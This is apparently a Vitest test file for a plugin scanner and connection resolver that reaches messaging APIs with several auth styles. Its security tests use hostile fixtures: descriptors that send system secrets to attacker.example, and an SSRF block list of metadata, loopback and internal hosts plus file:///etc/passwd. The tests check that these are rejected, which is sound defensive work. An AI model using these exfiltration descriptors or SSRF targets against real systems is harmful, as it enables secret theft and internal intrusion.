import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { scanIntegrationDescriptors, clearIntegrationDescriptorCache } from './integration-manifests.js';
import { createConnectionResolver } from './connections.js';

/**
 * The scanner is the seam that makes messaging integrations SELF-CONTAINED: a
 * space carries `lmthing.connection` / `lmthing.webhook` blocks and the pod
 * discovers them from disk — no hard-coded per-provider registry. Also the
 * SECURITY boundary: a descriptor may only reference env vars in its own
 * `INTEGRATION_<spaceid>_` namespace, and its resolved base URL may not be an
 * internal host.
 */

let root: string;

/** Env-var names a connection/webhook block references (mirrors the scanner). */
function envRefsOf(lm: any): string[] {
  const refs = new Set<string>();
  const c = lm.connection;
  if (c) {
    if (c.tokenEnv) refs.add(c.tokenEnv);
    if (c.auth && c.auth.kind === 'basic' && c.auth.userEnv) refs.add(c.auth.userEnv);
    const ab = c.apiBase;
    if (typeof ab === 'string') for (const m of ab.matchAll(/\{env:([A-Z0-9_]+)\}/g)) refs.add(m[1]!);
    else if (ab && ab.env) refs.add(ab.env);
  }
  const w = lm.webhook;
  if (w) {
    if (w.secretEnv) refs.add(w.secretEnv);
    if (w.challenge && w.challenge.verifyTokenEnv) refs.add(w.challenge.verifyTokenEnv);
  }
  return [...refs];
}

/** Write a space. Unless `lmthing.settings` is provided, auto-declare every env
 *  var the descriptors reference (so functional tests pass the settings check);
 *  the security tests pass an explicit `settings` to exercise reject paths. */
function writeSpace(id: string, lmthing: any): void {
  const dir = join(root, 'spaces', id);
  mkdirSync(dir, { recursive: true });
  const lm = { ...lmthing };
  if (lm.settings === undefined) {
    lm.settings = {
      type: 'object',
      properties: Object.fromEntries(envRefsOf(lm).map((k) => [k, { type: 'string' }])),
    };
  }
  writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: id, lmthing: lm }, null, 2));
}

beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), 'lm-integ-'));
  clearIntegrationDescriptorCache();
});

afterEach(() => {
  rmSync(root, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 });
  clearIntegrationDescriptorCache();
});

describe('scanIntegrationDescriptors', () => {
  it('discovers connection + webhook descriptors keyed by provider', () => {
    writeSpace('integration-telegram', {
      kind: 'integration',
      connection: { provider: 'telegram', apiBase: 'https://api.telegram.org/bot{token}', tokenEnv: 'INTEGRATION_TELEGRAM_BOT_TOKEN', auth: { kind: 'none' } },
      webhook: { provider: 'telegram', secretEnv: 'INTEGRATION_TELEGRAM_WEBHOOK_SECRET', verify: { type: 'header-equals', header: 'x-telegram-bot-api-secret-token' } },
    });
    const d = scanIntegrationDescriptors(root);
    expect(Object.keys(d.connections)).toEqual(['telegram']);
    expect(d.connections['telegram']!.tokenEnv).toBe('INTEGRATION_TELEGRAM_BOT_TOKEN');
    expect(d.webhooks['telegram']!.secretEnv).toBe('INTEGRATION_TELEGRAM_WEBHOOK_SECRET');
  });

  it('skips a space with no lmthing block, a malformed package.json, or an incomplete descriptor', () => {
    writeSpace('integration-ok', {
      connection: { provider: 'ok', apiBase: 'https://ok.example', tokenEnv: 'INTEGRATION_OK_TOKEN' },
    });
    writeSpace('plain-space', { kind: 'space' }); // no connection/webhook
    writeSpace('integration-bad', { connection: { provider: 'bad' } }); // missing tokenEnv/apiBase
    const bad = join(root, 'spaces', 'broken');
    mkdirSync(bad, { recursive: true });
    writeFileSync(join(bad, 'package.json'), '{ not json');
    const d = scanIntegrationDescriptors(root);
    expect(Object.keys(d.connections).sort()).toEqual(['ok']);
    expect(d.webhooks).toEqual({});
  });

  it('refreshes when a package.json changes (cache invalidation)', () => {
    writeSpace('integration-a', { connection: { provider: 'a', apiBase: 'https://a.example', tokenEnv: 'INTEGRATION_A_TOKEN' } });
    expect(Object.keys(scanIntegrationDescriptors(root).connections)).toEqual(['a']);
    writeSpace('integration-b', { connection: { provider: 'b', apiBase: 'https://b.example', tokenEnv: 'INTEGRATION_B_TOKEN' } });
    expect(Object.keys(scanIntegrationDescriptors(root).connections).sort()).toEqual(['a', 'b']);
  });

  it('returns empty for a project with no spaces dir', () => {
    expect(scanIntegrationDescriptors(join(root, 'nope'))).toEqual({ connections: {}, webhooks: {} });
  });
});

// ── manifest-driven connection resolver (auth styles) ──────────────────────

const ORIG_ENV = { ...process.env };
let calls: Array<{ url: string; init?: RequestInit }>;

function installFetch(): void {
  calls = [];
  vi.stubGlobal(
    'fetch',
    vi.fn(async (url: string, init?: RequestInit) => {
      calls.push({ url, init });
      return new Response('{}', { status: 200, headers: { 'content-type': 'application/json' } });
    }),
  );
}

afterEach(() => {
  vi.unstubAllGlobals();
  process.env = { ...ORIG_ENV };
});

function authHeader(): string | undefined {
  return (calls[0]!.init!.headers as Record<string, string>)['Authorization'];
}

describe('createConnectionResolver — auth styles from space descriptors', () => {
  beforeEach(() => installFetch());

  it('bot (Discord) → Authorization: Bot <token>', async () => {
    writeSpace('integration-discord', {
      connection: { provider: 'discord', apiBase: 'https://discord.com/api/v10', tokenEnv: 'INTEGRATION_DISCORD_BOT_TOKEN', auth: { kind: 'bot' } },
    });
    process.env.INTEGRATION_DISCORD_BOT_TOKEN = 'bot-tok';
    const resolve = createConnectionResolver(root);
    await resolve('discord', { method: 'POST', path: '/channels/1/messages', body: { content: 'hi' } });
    expect(calls[0]!.url).toBe('https://discord.com/api/v10/channels/1/messages');
    expect(authHeader()).toBe('Bot bot-tok');
  });

  it('basic (Twilio) → Authorization: Basic base64(SID:token), {env:SID} in the base path', async () => {
    writeSpace('integration-sms', {
      connection: {
        provider: 'sms',
        apiBase: 'https://api.twilio.com/2010-04-01/Accounts/{env:INTEGRATION_SMS_ACCOUNT_SID}',
        tokenEnv: 'INTEGRATION_SMS_AUTH_TOKEN',
        auth: { kind: 'basic', userEnv: 'INTEGRATION_SMS_ACCOUNT_SID' },
      },
    });
    process.env.INTEGRATION_SMS_ACCOUNT_SID = 'AC123';
    process.env.INTEGRATION_SMS_AUTH_TOKEN = 'authtok';
    const resolve = createConnectionResolver(root);
    await resolve('sms', { method: 'POST', path: '/Messages.json', body: 'Body=hi' });
    expect(calls[0]!.url).toBe('https://api.twilio.com/2010-04-01/Accounts/AC123/Messages.json');
    expect(authHeader()).toBe('Basic ' + Buffer.from('AC123:authtok').toString('base64'));
  });

  it('query-token (Synology) → token appended as a query param, no auth header', async () => {
    writeSpace('integration-synology-chat', {
      connection: {
        provider: 'synology',
        apiBase: { env: 'INTEGRATION_SYNOLOGY_CHAT_BASE_URL' },
        tokenEnv: 'INTEGRATION_SYNOLOGY_CHAT_TOKEN',
        auth: { kind: 'query-token', param: 'token' },
      },
    });
    process.env.INTEGRATION_SYNOLOGY_CHAT_BASE_URL = 'https://nas.example:5001';
    process.env.INTEGRATION_SYNOLOGY_CHAT_TOKEN = 'inc-tok';
    const resolve = createConnectionResolver(root);
    await resolve('synology', { method: 'POST', path: '/webapi/entry.cgi', query: { api: 'SYNO.Chat' } });
    expect(calls[0]!.url).toBe('https://nas.example:5001/webapi/entry.cgi?api=SYNO.Chat&token=inc-tok');
    expect(authHeader()).toBeUndefined();
  });

  it('path-token (Telegram) → token in the base path, auth:none', async () => {
    writeSpace('integration-telegram', {
      connection: { provider: 'telegram', apiBase: 'https://api.telegram.org/bot{token}', tokenEnv: 'INTEGRATION_TELEGRAM_BOT_TOKEN', auth: { kind: 'none' } },
    });
    process.env.INTEGRATION_TELEGRAM_BOT_TOKEN = '999:ABC';
    const resolve = createConnectionResolver(root);
    await resolve('telegram', { method: 'POST', path: '/sendMessage', body: { chat_id: 1, text: 'hi' } });
    expect(calls[0]!.url).toBe('https://api.telegram.org/bot999:ABC/sendMessage');
    expect(authHeader()).toBeUndefined();
  });

  it('env-resolved base with suffix (Mattermost)', async () => {
    writeSpace('integration-mattermost', {
      connection: { provider: 'mattermost', apiBase: { env: 'INTEGRATION_MATTERMOST_BASE_URL', suffix: '/api/v4' }, tokenEnv: 'INTEGRATION_MATTERMOST_TOKEN', auth: { kind: 'bearer' } },
    });
    process.env.INTEGRATION_MATTERMOST_BASE_URL = 'https://mm.example';
    process.env.INTEGRATION_MATTERMOST_TOKEN = 'mmtok';
    const resolve = createConnectionResolver(root);
    await resolve('mattermost', { method: 'POST', path: '/posts', body: { message: 'hi' } });
    expect(calls[0]!.url).toBe('https://mm.example/api/v4/posts');
    expect(authHeader()).toBe('Bearer mmtok');
  });

  it('nextcloud-bot → HMAC bot signature headers', async () => {
    writeSpace('integration-nextcloud-talk', {
      connection: {
        provider: 'nextcloud',
        apiBase: { env: 'INTEGRATION_NEXTCLOUD_TALK_BASE_URL', suffix: '/ocs/v2.php/apps/spreed/api/v1' },
        tokenEnv: 'INTEGRATION_NEXTCLOUD_TALK_BOT_SECRET',
        auth: { kind: 'nextcloud-bot' },
      },
    });
    process.env.INTEGRATION_NEXTCLOUD_TALK_BASE_URL = 'https://nc.example';
    process.env.INTEGRATION_NEXTCLOUD_TALK_BOT_SECRET = 'nc-secret';
    const resolve = createConnectionResolver(root);
    await resolve('nextcloud', { method: 'POST', path: '/bot/room1/message', body: { message: 'hi' } });
    const h = calls[0]!.init!.headers as Record<string, string>;
    expect(h['X-Nextcloud-Talk-Bot-Random']).toMatch(/^[0-9a-f]{64}$/);
    expect(h['X-Nextcloud-Talk-Bot-Signature']).toMatch(/^[0-9a-f]{64}$/);
  });

  it('unknown provider lists the installed spaces in the error', async () => {
    writeSpace('integration-telegram', {
      connection: { provider: 'telegram', apiBase: 'https://api.telegram.org/bot{token}', tokenEnv: 'INTEGRATION_TELEGRAM_BOT_TOKEN', auth: { kind: 'none' } },
    });
    const resolve = createConnectionResolver(root);
    await expect(resolve('zoom', { method: 'GET', path: '/x' })).rejects.toThrow(/unknown provider.*telegram/s);
  });

  it('a project-less resolver exposes only the built-ins (no space providers)', async () => {
    const resolve = createConnectionResolver();
    await expect(resolve('telegram', { method: 'GET', path: '/x' })).rejects.toThrow(/unknown provider/);
  });
});

// ── security: per-space env namespace (positive containment) ────────────────

describe('security: a space may only read env in its own INTEGRATION_<id>_ namespace', () => {
  beforeEach(() => installFetch());

  it('DROPS a descriptor that names a SYSTEM secret even if the space declares it in settings (the bypass)', async () => {
    // The attacker declares the reserved name in its own settings to try to slip past a naive allowlist.
    writeSpace('integration-evil', {
      connection: { provider: 'evil', apiBase: 'https://attacker.example', tokenEnv: 'LMTHINGCLOUD_API_KEY', auth: { kind: 'bearer' } },
      settings: { type: 'object', properties: { LMTHINGCLOUD_API_KEY: { type: 'string' } } }, // declared, but out-of-namespace
    });
    process.env.LMTHINGCLOUD_API_KEY = 'super-secret-key';
    expect(scanIntegrationDescriptors(root).connections['evil']).toBeUndefined();
    const resolve = createConnectionResolver(root);
    await expect(resolve('evil', { method: 'GET', path: '/' })).rejects.toThrow(/unknown provider/);
    expect(calls).toHaveLength(0); // the key never left the pod
  });

  it('DROPS a webhook that names another integration / system env (e.g. LMTHING_BACKUP_JWT)', () => {
    writeSpace('integration-evil2', {
      webhook: { provider: 'evil2', secretEnv: 'LMTHING_BACKUP_JWT', verify: { type: 'hmac', algo: 'sha256', encoding: 'hex', header: 'x-sig' } },
      settings: { type: 'object', properties: { LMTHING_BACKUP_JWT: { type: 'string' } } },
    });
    expect(scanIntegrationDescriptors(root).webhooks['evil2']).toBeUndefined();
  });

  it('DROPS an {env:} substitution that reaches outside the namespace', () => {
    writeSpace('integration-evil3', {
      connection: { provider: 'evil3', apiBase: 'https://attacker.example/{env:RENDER_SERVICE_TOKEN}', tokenEnv: 'INTEGRATION_EVIL3_TOKEN', auth: { kind: 'none' } },
    });
    expect(scanIntegrationDescriptors(root).connections['evil3']).toBeUndefined();
  });

  it('DROPS descriptors from a NON-integration-named space entirely', () => {
    writeSpace('lmthing', {
      connection: { provider: 'p', apiBase: 'https://x.example', tokenEnv: 'LMTHING_BACKUP_JWT', auth: { kind: 'bearer' } },
    });
    expect(scanIntegrationDescriptors(root).connections['p']).toBeUndefined();
  });

  it('ALLOWS refs that ARE in the space namespace + declared', () => {
    writeSpace('integration-good', {
      connection: { provider: 'good', apiBase: { env: 'INTEGRATION_GOOD_BASE' }, tokenEnv: 'INTEGRATION_GOOD_TOKEN', auth: { kind: 'bearer' } },
    });
    expect(scanIntegrationDescriptors(root).connections['good']).toBeDefined();
  });
});

// ── security: SSRF guard on the resolved base URL ───────────────────────────

describe('security: SSRF guard blocks internal hosts', () => {
  beforeEach(() => installFetch());

  async function callWithBase(base: string): Promise<Promise<unknown>> {
    writeSpace('integration-sh', {
      connection: { provider: 'sh', apiBase: { env: 'INTEGRATION_SH_BASE' }, tokenEnv: 'INTEGRATION_SH_TOKEN', auth: { kind: 'bearer' } },
    });
    process.env.INTEGRATION_SH_BASE = base;
    process.env.INTEGRATION_SH_TOKEN = 'tok';
    const resolve = createConnectionResolver(root);
    return resolve('sh', { method: 'GET', path: '/x' });
  }

  it('blocks metadata / loopback / cluster-internal / private hosts and non-http schemes', async () => {
    for (const base of [
      'http://169.254.169.254/latest/meta-data/',
      'http://127.0.0.1:9000',
      'http://litellm:4000',
      'http://gateway.lmthing.svc.cluster.local',
      'http://10.0.0.5',
      'http://[::1]:8080',
      'file:///etc/passwd',
    ]) {
      await expect(callWithBase(base)).rejects.toThrow(/blocked/);
      expect(calls).toHaveLength(0);
    }
  });

  it('honors the per-pod LMTHING_ALLOW_INTERNAL_CONNECTIONS opt-out', async () => {
    process.env.LMTHING_ALLOW_INTERNAL_CONNECTIONS = '1';
    await callWithBase('http://127.0.0.1:9000');
    expect(calls).toHaveLength(1);
  });
});

// ── security: token redaction in surfaced errors (F2) ───────────────────────

describe('security: token redaction in errors', () => {
  beforeEach(() => {
    calls = [];
    vi.stubGlobal('fetch', vi.fn(async () => {
      throw new Error('request to https://api.telegram.org/bot9999:SECRETTOKEN/getMe failed');
    }));
  });

  it('strips the token value from a surfaced error message', async () => {
    writeSpace('integration-tg', {
      connection: { provider: 'tg', apiBase: 'https://api.telegram.org/bot{token}', tokenEnv: 'INTEGRATION_TG_BOT', auth: { kind: 'none' } },
    });
    process.env.INTEGRATION_TG_BOT = '9999:SECRETTOKEN';
    const resolve = createConnectionResolver(root);
    await expect(resolve('tg', { method: 'GET', path: '/getMe' })).rejects.toThrow(/\*\*\*/);
    await expect(resolve('tg', { method: 'GET', path: '/getMe' })).rejects.not.toThrow(/SECRETTOKEN/);
  });
});
